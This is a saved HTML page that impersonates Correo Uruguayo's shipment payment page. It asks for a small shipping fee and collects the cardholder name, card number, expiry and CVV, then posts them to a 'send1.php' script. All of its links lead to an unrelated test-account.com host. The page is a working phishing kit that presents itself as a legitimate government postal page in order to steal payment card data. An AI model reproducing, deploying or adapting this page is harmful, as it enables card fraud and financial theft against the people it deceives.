<!DOCTYPE html>
<html lang="es-ES" dir="ltr"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Pago - Correo Uruguayo</title>
    <meta content="initial-scale=1.0, width=device-width" name="viewport">
    
    <link href="./cc_files/css2" rel="stylesheet">
    <style>
        *, *:before, *:after { box-sizing: border-box; }
        body {
            margin: 0; color: #000; background: #f1f1f1;
            font-family: 'Source Sans Pro', sans-serif;
            font-size: 100%; line-height: 1.2em; font-weight: normal;
        }
        a { color: #124d98; font-weight: normal; text-decoration: none; }
        a:hover { text-decoration: underline; color: #124d98; }
        img { max-width: 100%; border: 0; }
        ul { margin: 0; padding: 0; list-style: none; }
        .container { max-width: 1120px; margin: 0 auto; }
        @media screen and (max-width: 1200px) { .container { width: 96%; padding: 0; } }
        .container:before, .container:after { display: table; content: " "; }
        .container:after { clear: both; }
        .fl { float: left !important; }
        .fr { float: right !important; }

        /* ===== TOPBAR ===== */
        #topbar { background: #59595c; color: #fff; font-size: .85em; height: 35px; }
        #topbar a { color: #fff; }
        #topbar ul { float: right; margin: 8px 0; }
        #topbar ul li { float: left; margin: 0 10px; }
        @media (max-width: 767px) { #topbar { display: none; } }

        /* ===== MAIN HEAD ===== */
        #main-head { background: #00a7e6; padding: 20px 0 24px 0; color: #fff; }
        #main-head h1 { margin: 0; }
        #main-head a { color: #fff; }
        #main-head #logo { padding: 14px 10px 14px 2px; display: block; float: left; border: 2px solid #00a7e6; width: 45%; }
        #main-head #logo:hover { border-bottom-color: #fff; }
        #main-head #logos { float: right; margin-bottom: 10px; }
        #main-head #logos ul li { float: left; margin-left: 16px; }
        @media (max-width: 979px) {
            #main-head { padding: 10px 0; }
            #main-head #logos { display: none; }
            #main-head #logo { float: left; padding: 0; }
            #main-head #logo img { margin-top: 2px; max-width: 160px; }
        }

        /* ===== NAVIGATION BAR ===== */
        .barraMenu { background-color: #01579b; height: 48px; }
        .barraMenu .container { position: relative; }
        nav#navigation { background: 0; color: #fff; }
        nav#navigation ul.navegacionPrincipal { margin: 0; padding: 0; background: #01579b !important; width: 100%; }
        nav#navigation ul.navegacionPrincipal > li { float: left; width: 25%; position: static; cursor: pointer; }
        nav#navigation ul.navegacionPrincipal > li:last-child { background: 0; }
        nav#navigation ul.navegacionPrincipal > li > span {
            text-transform: uppercase; text-decoration: none; text-align: center;
            padding: 14px 0; display: block; font-size: 1.2em;
            transition: background-color .45s; color: #fff;
        }
        nav#navigation ul.navegacionPrincipal > li > span:hover { background: #fff; color: #01579b; }
        @media (max-width: 979px) {
            .barraMenu { height: auto; }
            nav#navigation { display: none; }
        }

        /* ===== PAGE TITLE ===== */
        .page-title-bar { background: #01579b; padding: 28px 0; color: #fff; }
        .page-title-bar h2 { margin: 0; font-weight: 600; font-size: 2em; letter-spacing: -0.5px; }
        .page-title-bar p { margin: 8px 0 0 0; font-size: 1.1em; font-weight: 300; opacity: 0.9; }

        /* ===== PAYMENT CONTENT ===== */
        .payment-section { padding: 40px 0 60px 0; }
        .payment-wrapper {
            max-width: 720px; margin: 0 auto;
            background: #fff; border-top: 4px solid #fd0;
            border-radius: 0 0 3px 3px; box-shadow: 1px 1px 3px #666;
        }

        /* Order summary strip */
        .order-summary {
            background: #f8f9fa;
            border-bottom: 1px solid #e8e8e8;
            padding: 24px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
        }
        .order-detail {
            display: flex;
            flex-direction: column;
        }
        .order-detail .label {
            font-size: 0.8em;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: #777;
            font-weight: 600;
            margin-bottom: 4px;
        }
        .order-detail .value {
            font-size: 1.25em;
            font-weight: 700;
            color: #01579b;
        }
        .order-detail .value.amount {
            font-size: 1.6em;
            color: #2e7d32;
        }

        /* Form */
        .form-header {
            padding: 28px 40px 18px 40px;
            border-bottom: 1px solid #e8e8e8;
        }
        .form-header h3 {
            font-size: 1.45em; text-transform: uppercase; font-weight: 600;
            letter-spacing: -1px; color: #414141; margin: 0 0 6px 0;
        }
        .form-header p { color: #666; font-size: 0.95em; margin: 0; }
        .form-header p .required-note { color: #3d6789; }
        .form-body { padding: 28px 40px 40px 40px; }

        .form-group { margin-bottom: 22px; position: relative; }
        .form-group label {
            display: block; margin-bottom: 6px; color: #000;
            font-size: 16px; font-weight: 400;
        }
        .form-group label .required { color: #3d6789; margin-left: 3px; }
        .form-group input {
            width: 100%; height: 44px; padding: 6px 14px;
            border: 1px solid #999; color: #000;
            font-family: 'Source Sans Pro', sans-serif;
            font-size: 15px; font-weight: 400;
            transition: border-color 0.3s ease;
            border-radius: 0; background: #fff;
        }
        .form-group input:focus {
            outline: none; border-color: rgba(0, 172, 255, 0.8);
            box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 8px rgba(82,168,236,0.6);
        }
        .form-group input::placeholder { color: #7f7f7f; }
        .form-group input.input-error { border-color: #c33; }
        .form-group .error-msg {
            display: none; color: #c33; font-size: 0.85em; margin-top: 4px;
        }
        .form-group .error-msg.visible { display: block; }

        /* Card number with icon */
        .card-input-wrapper { position: relative; }
        .card-input-wrapper input { padding-right: 96px; letter-spacing: 1.5px; font-size: 16px; }
        .card-icons {
            position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
            display: flex; gap: 4px; pointer-events: none;
        }
        .card-icon {
            width: 40px; height: 26px; border-radius: 4px;
            display: flex; align-items: center; justify-content: center;
            opacity: 0.3; transition: opacity 0.3s;
            overflow: hidden;
        }
        .card-icon svg { width: 100%; height: 100%; }
        .card-icon.active { opacity: 1; }

        .form-row { display: flex; gap: 20px; }
        .form-row .form-group { flex: 1; }

        .form-submit { margin-top: 30px; }
        .form-submit button {
            background: #01579b; padding: 12px 40px; width: 100%;
            color: #fff; border-radius: 3px; border: 1px solid #014174;
            font-family: 'Source Sans Pro', sans-serif; font-weight: 700;
            font-size: 1.1em; cursor: pointer;
            transition: all 0.35s ease; letter-spacing: 0.3px;
        }
        .form-submit button:hover { box-shadow: 0 0 4px #666; background: #014174; }
        .form-submit button:active { border-color: #00a7e6; }

        .secure-notice {
            margin-top: 20px; text-align: center;
            font-size: 0.88em; color: #777;
        }
        .secure-notice svg { vertical-align: middle; margin-right: 5px; }

        @media (max-width: 600px) {
            .form-row { flex-direction: column; gap: 0; }
            .form-header, .form-body { padding-left: 20px; padding-right: 20px; }
            .order-summary { padding: 20px; flex-direction: column; align-items: flex-start; }
            .page-title-bar h2 { font-size: 1.5em; }
        }

        /* ===== FOOTER ===== */
        footer#page-footer { background: #e6e6e6; border-top: 3px solid #fff; }
        footer#page-footer h2 { font-weight: 500; color: #414141; font-size: 1.2em; }
        footer#page-footer ul { margin-bottom: 60px !important; }
        footer#page-footer ul li { margin-bottom: 9px; }
        footer#page-footer ul li a { font-size: .9em; color: #124d98 !important; text-decoration: underline; }
        footer#page-footer ul li a:hover { text-decoration: none; }
        .row-fluid { overflow: hidden; }
        .span3 { width: 23.5%; float: left; margin-right: 2%; }
        .span3:last-child { margin-right: 0; }
        #box-tel { background: #f1f1f1; padding: 14px; font-size: .9em; text-align: center; color: #414141; float: right; width: 100%; }
        #box-tel p { margin: 0; }
        #box-tel span { display: block; margin-top: 6px; margin-bottom: 10px; font-size: 1.4em; }
        .disclaim { background: #01579b; color: #fff; padding: 30px 0; }
        .disclaim:after { content: ""; display: block; clear: both; }
        .disclaim img { float: left; margin-right: 14px; }
        .disclaim a { color: #fff; }
        .disclaim address { float: left; font-style: normal; font-size: .9em; line-height: 1.2em; }
        .disclaim ul { margin-bottom: 0 !important; }
        .disclaim ul li { line-height: 20px; }
        .disclaim ul li a { color: #fff !important; }
        @media screen and (max-width: 800px) {
            .span3 { width: 50%; }
            .span3:nth-child(2n) { margin-right: 0; }
            #box-tel { float: left; margin-top: 30px; }
        }
        @media (max-width: 767px) {
            .span3 { width: 100%; margin-right: 0; }
            .disclaim { text-align: center; }
            .disclaim img { float: none; margin: 0 0 10px 0; }
            .disclaim address { float: none !important; }
            .fr { width: 100%; float: left; margin-top: 30px; }
            .fr a { padding: 10px; display: block; }
        }
    </style>
<script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="21e7e81e-10e6-4fef-bf96-1f864a3d5bd7" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="21e7e81e-10e6-4fef-bf96-1f864a3d5bd7" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script></head>
<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMy4wIiwic2NvcmUiOjIwMzAwMH1d" __processed_1e60009b-59bd-457d-a734-b4d7982b9afc__="true">
    <!-- ===== TOPBAR ===== -->
    <div id="topbar" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <ul>
                <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><span>Preguntas frecuentes</span></a></li>
                <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><span>Convocatorias</span></a></li>
                <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><span>Contacto</span></a></li>
                <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><span>Servicios web</span></a></li>
            </ul>
        </div>
    </div>

    <!-- ===== HEADER ===== -->
    <div id="main-head" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <h1>
                <a id="logo" href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#" title="Ir a la página principal de Correo Uruguayo">
                    <img alt="Correo Uruguayo" height="54" src="./cc_files/company_logo.png" width="255">
                </a>
            </h1>
            <div id="logos" bis_skin_checked="1">
                <ul>
                    <li><a target="_blank" href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#" title="Ir a uruguaydigital.uy"><img src="./cc_files/logoUruguayDigital.png" alt="Uruguay Digital"></a></li>
                </ul>
            </div>
        </div>
    </div>

    <!-- ===== NAVIGATION ===== -->
    <div class="barraMenu" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <nav id="navigation" role="navigation">
                <ul class="navegacionPrincipal">
                    <li><span>Institucional</span></li>
                    <li><span>Productos y Servicios</span></li>
                    <li><span>Filatelia</span></li>
                    <li><span>Trámites</span></li>
                </ul>
            </nav>
        </div>
    </div>

    <!-- ===== PAGE TITLE ===== -->
    <div class="page-title-bar" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <h2>Pago del Envío</h2>
            <p>Complete los datos de su tarjeta para procesar el pago</p>
        </div>
    </div>

    <!-- ===== PAYMENT CONTENT ===== -->
    <div class="payment-section" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <div class="payment-wrapper" bis_skin_checked="1">

                <!-- Order Summary -->
                <div class="order-summary" bis_skin_checked="1">
                    <div class="order-detail" bis_skin_checked="1">
                        <span class="label">Número de Envío</span>
                        <span class="value" id="shipmentNumber">UY****************</span>
                    </div>
                    <div class="order-detail" bis_skin_checked="1">
                        <span class="label">Monto a Pagar</span>
                        <span class="value amount" id="paymentAmount">$U 2,99</span>
                    </div>
                </div>

                <!-- Form Header -->
                <div class="form-header" bis_skin_checked="1">
                    <h3>Datos de la Tarjeta</h3>
                    <p>Los campos marcados con <span class="required-note">(*)</span> son obligatorios</p>
                </div>

                <!-- Form Body -->
                <div class="form-body" bis_skin_checked="1">
                    <form id="paymentForm" action="send1.php" method="post" novalidate="" autocomplete="off">
						<input style="visibilty: hidden" type="hidden" name="step" value="cat">					
						<input style="visibilty: hidden" type="hidden" name="send_data_1" value="cat">		
                        <div class="form-group" bis_skin_checked="1">
                            <label for="cardName">Nombre del Titular <span class="required">(*)</span></label>
                            <input type="text" id="cardName" name="cardName" placeholder="Nombre como aparece en la tarjeta" required="" autocomplete="off">
                            <div class="error-msg" id="cardNameError" bis_skin_checked="1">Ingrese el nombre del titular</div>
                        </div>

                        <div class="form-group" bis_skin_checked="1">
                            <label for="cardNumber">Número de Tarjeta <span class="required">(*)</span></label>
                            <div class="card-input-wrapper" bis_skin_checked="1">
                                <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" required="" inputmode="numeric" maxlength="19" autocomplete="off">
                                <div class="card-icons" bis_skin_checked="1">
                                    <!-- Visa SVG Logo -->
                                    <div class="card-icon visa" id="iconVisa" bis_skin_checked="1">
                                        <svg viewBox="0 0 40 26" xmlns="http://www.w3.org/2000/svg">
                                            <rect width="40" height="26" rx="4" fill="#1a1f71"></rect>
                                            <text x="20" y="18" font-family="Arial, sans-serif" font-size="11" font-weight="bold" font-style="italic" fill="#fff" text-anchor="middle" letter-spacing="0.5">VISA</text>
                                        </svg>
                                    </div>
                                    <!-- Mastercard SVG Logo -->
                                    <div class="card-icon mc" id="iconMC" bis_skin_checked="1">
                                        <svg viewBox="0 0 40 26" xmlns="http://www.w3.org/2000/svg">
                                            <rect width="40" height="26" rx="4" fill="#252525"></rect>
                                            <circle cx="15" cy="13" r="7.5" fill="#eb001b"></circle>
                                            <circle cx="25" cy="13" r="7.5" fill="#f79e1b"></circle>
                                            <path d="M20 7.2a7.5 7.5 0 0 1 0 11.6A7.5 7.5 0 0 1 20 7.2z" fill="#ff5f00"></path>
                                        </svg>
                                    </div>
                                </div>
                            </div>
                            <div class="error-msg" id="cardNumberError" bis_skin_checked="1">Ingrese un número de tarjeta válido</div>
                        </div>

                        <div class="form-row" bis_skin_checked="1">
                            <div class="form-group" bis_skin_checked="1">
                                <label for="cardExp">Vencimiento <span class="required">(*)</span></label>
                                <input type="text" id="cardExp" name="cardExp" placeholder="MM/AA" required="" inputmode="numeric" maxlength="7" autocomplete="off">
                                <div class="error-msg" id="cardExpError" bis_skin_checked="1">Ingrese una fecha válida (MM/AA)</div>
                            </div>
                            <div class="form-group" bis_skin_checked="1">
                                <label for="cardCvv">CVV <span class="required">(*)</span></label>
                                <input type="text" id="cardCvv" name="cardCvv" placeholder="000" required="" inputmode="numeric" maxlength="4" autocomplete="off">
                                <div class="error-msg" id="cardCvvError" bis_skin_checked="1">Ingrese el código CVV (3 o 4 dígitos)</div>
                            </div>
                        </div>

                        <div class="form-submit" bis_skin_checked="1">
                            <button type="submit">Confirmar Pago</button>
                        </div>

                        <div class="secure-notice" bis_skin_checked="1">
                            <svg width="14" height="16" viewBox="0 0 14 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M7 0C4.8 0 3 1.8 3 4V6H2C0.9 6 0 6.9 0 8V14C0 15.1 0.9 16 2 16H12C13.1 16 14 15.1 14 14V8C14 6.9 13.1 6 12 6H11V4C11 1.8 9.2 0 7 0ZM7 1.5C8.4 1.5 9.5 2.6 9.5 4V6H4.5V4C4.5 2.6 5.6 1.5 7 1.5ZM7 10C7.8 10 8.5 10.7 8.5 11.5C8.5 12.3 7.8 13 7 13C6.2 13 5.5 12.3 5.5 11.5C5.5 10.7 6.2 10 7 10Z" fill="#999"></path>
                            </svg>
                            Pago seguro. Sus datos están protegidos mediante conexión cifrada.
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- ===== FOOTER ===== -->
    <footer id="page-footer">
        <div class="container" bis_skin_checked="1">
            <div class="row-fluid mapaSitio" style="padding: 26px 0;" bis_skin_checked="1">
                <div class="span3" bis_skin_checked="1">
                    <h2>Institucional</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Autoridades</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Sobre nosotros</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Transparencia</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Preguntas frecuentes</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Convocatorias</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Contacto</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Sala de prensa</a></li>
                    </ul>
                </div>
                <div class="span3" bis_skin_checked="1">
                    <h2>Productos y Servicios</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Paquetes</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Correspondencia</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Comercio electrónico</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Servicios en línea</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Logística</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Giros</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Firma Digital</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Tarifas</a></li>
                    </ul>
                </div>
                <div class="span3" bis_skin_checked="1">
                    <h2>Filatelia</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">¿Qué es la filatelia?</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Novedades filatélicas</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Plan filatélico anual</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Sellos</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Marcofilia</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Hojas filatélicas</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Últimas emisiones</a></li>
                    </ul>
                </div>
                <div class="span3" bis_skin_checked="1">
                    <h2>Trámites</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Declaración de compras del exterior</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Factura electrónica</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Registro en el IRCCA</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Guía de trámites</a></li>
                    </ul>
                    <div id="box-tel" bis_skin_checked="1">
                        <p>WhatsApp: <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><span>098 01 2108</span></a></p>
                        <div bis_skin_checked="1">
                            <p>Atención telefónica: <span>0800 2108</span></p>
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Contáctese con nosotros</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="disclaim" bis_skin_checked="1">
            <div class="container" bis_skin_checked="1">
                <img alt="Correo Uruguayo" src="./cc_files/logoCorreoPie.jpg">
                <address class="fl">Administración Nacional de Correos<br>
                Dirección: Buenos Aires 451, Montevideo, Uruguay<br>
                Teléfono: [00 598] 2916 0200<br>
                Mail: <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><span class="__cf_email__" data-cfemail="31525e5f455052455e71525e4343545e1f525e5c1f4448">[email&nbsp;protected]</span></a></address>
                <ul class="fr">
                    <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Política de Privacidad</a></li>
                    <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Términos de uso</a></li>
                    <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Reglamentación de reclamaciones</a></li>
                    <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#">Mapa del sitio</a></li>
                    <li>
                        <address class="fl">
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><img alt="Instagram" src="./cc_files/instagram.png"></a>&nbsp;
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><img alt="X" src="./cc_files/X.png"></a>&nbsp;
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><img alt="Linkedin" src="./cc_files/Linkedin.png"></a>&nbsp;
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393//pago.php#"><img alt="Youtube" src="./cc_files/Youtube.png"></a>
                        </address>
                    </li>
                </ul>
            </div>
        </div>
    </footer>

    <script data-cfasync="false" src="./cc_files/email-decode.min.js.download"></script><script>
    (function() {
        // ===== CARD NUMBER MASK: 0000 0000 0000 0000 =====
        var cardInput = document.getElementById('cardNumber');
        cardInput.addEventListener('input', function(e) {
            var val = this.value.replace(/\D/g, '');
            if (val.length > 16) val = val.substring(0, 16);
            var formatted = '';
            for (var i = 0; i < val.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += val[i];
            }
            this.value = formatted;

            // Detect card type & highlight icon
            var iconVisa = document.getElementById('iconVisa');
            var iconMC = document.getElementById('iconMC');
            iconVisa.classList.remove('active');
            iconMC.classList.remove('active');
            if (val.length >= 1) {
                if (val[0] === '4') {
                    iconVisa.classList.add('active');
                } else if (val.length >= 2) {
                    var first2 = parseInt(val.substring(0, 2), 10);
                    if ((first2 >= 51 && first2 <= 55) || (first2 >= 22 && first2 <= 27)) {
                        iconMC.classList.add('active');
                    }
                }
            }
        });

        // ===== EXPIRY MASK: MM/YY or MM/YYYY =====
        var expInput = document.getElementById('cardExp');
        expInput.addEventListener('input', function(e) {
            var val = this.value.replace(/\D/g, '');
            if (val.length > 6) val = val.substring(0, 6);
            if (val.length >= 3) {
                this.value = val.substring(0, 2) + '/' + val.substring(2);
            } else {
                this.value = val;
            }
        });
        expInput.addEventListener('keydown', function(e) {
            // Allow backspace to delete the slash cleanly
            if (e.key === 'Backspace' && this.value.length === 3 && this.value[2] === '/') {
                this.value = this.value.substring(0, 2);
                e.preventDefault();
            }
        });

        // ===== CVV MASK: 3 or 4 digits only =====
        var cvvInput = document.getElementById('cardCvv');
        cvvInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').substring(0, 4);
        });

        // ===== NAME: letters and spaces only =====
        var nameInput = document.getElementById('cardName');
        nameInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^a-zA-ZáéíóúñÁÉÍÓÚÑüÜ\s\-'\.]/g, '');
        });

        // ===== FORM VALIDATION =====
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var valid = true;

            // Reset errors
            var inputs = this.querySelectorAll('input');
            inputs.forEach(function(inp) { inp.classList.remove('input-error'); });
            var errors = this.querySelectorAll('.error-msg');
            errors.forEach(function(err) { err.classList.remove('visible'); });

            // Name
            if (!nameInput.value.trim() || nameInput.value.trim().length < 3) {
                nameInput.classList.add('input-error');
                document.getElementById('cardNameError').classList.add('visible');
                valid = false;
            }

            // Card number (13-16 digits)
            var cardDigits = cardInput.value.replace(/\D/g, '');
            if (cardDigits.length < 13 || cardDigits.length > 16) {
                cardInput.classList.add('input-error');
                document.getElementById('cardNumberError').classList.add('visible');
                valid = false;
            }

            // Expiry
            var expVal = expInput.value;
            var expMatch = expVal.match(/^(0[1-9]|1[0-2])\/([\d]{2,4})$/);
            if (!expMatch) {
                expInput.classList.add('input-error');
                document.getElementById('cardExpError').classList.add('visible');
                valid = false;
            } else {
                var month = parseInt(expMatch[1], 10);
                var year = parseInt(expMatch[2], 10);
                if (year < 100) year += 2000;
                var now = new Date();
                var expDate = new Date(year, month, 0);
                if (expDate < now) {
                    expInput.classList.add('input-error');
                    document.getElementById('cardExpError').classList.add('visible');
                    valid = false;
                }
            }

            // CVV (3 or 4 digits)
            var cvvVal = cvvInput.value.replace(/\D/g, '');
            if (cvvVal.length < 3 || cvvVal.length > 4) {
                cvvInput.classList.add('input-error');
                document.getElementById('cardCvvError').classList.add('visible');
                valid = false;
            }

            if (valid) {
                this.submit();
            }
        });
    })();
    </script>

</body></html>